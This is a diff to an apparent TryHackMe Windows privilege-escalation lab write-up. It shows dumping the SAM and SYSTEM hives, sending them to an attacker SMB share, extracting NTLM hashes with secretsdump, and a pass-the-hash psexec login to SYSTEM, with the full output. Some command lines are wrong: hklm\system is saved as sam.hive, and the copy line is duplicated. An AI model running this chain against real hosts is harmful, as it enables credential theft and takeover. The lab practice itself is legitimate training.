@@ -142,3 +142,69 @@ nt authority\system:
 
 get flag!
 THM{INSECURE_SVC_CONFIG}
+
+# Final challenge
+
+For the final challenge we will need to use impacket it may be easier to use the attackbox for this task. Or install impacket. This is an optional install on Kali-linux:
+
+sudo apt install python3-impacket
+
+this doesn't automatically install python scripts into /opt as in the examples. So... maybe use find? I did. Not sure what's going on there.
+
+On remote machine start a PS or CMD session as admin and use given creds.
+
+run:
+reg save hklm\system C:\Users\THMBackup\system.hive 
+reg save hklm\system C:\Users\THMBackup\sam.hive 
+
+On attacking system set up an smb share with impacket tools.
+
+first create a folder called share then start your smb server:
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share.
+
+copy C:\Users\THMBackup\sam.hive \\ATTACK_IP\public\
+copy C:\Users\THMBackup\sam.hive \\ATTACK_IP\public\
+
+on remote system copy files
+
+on attack system:
+Use impacket to extract credentials from sam.hive and system.hive
+
+The location of your impacket python files may vary...not sure why the ones in /doc/ worked for me ???
+
+──(vagrant㉿kali)-[~/winPrivEsc/share]
+└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
+THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
+[*] Cleaning up... 
+
+──(vagrant㉿kali)-[~/winPrivEsc/share]
+└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.33.254                                                                                                                                                    130 ⨯
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.33.254.....
+[*] Found writable share ADMIN$
+[*] Uploading file rBzYacJq.exe
+[*] Opening SVCManager on 10.10.33.254.....
+[*] Creating service WCNB on 10.10.33.254.....
+[*] Starting service WCNB.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
+THM{SEFLAGPRIVILEGE}
+
+
+
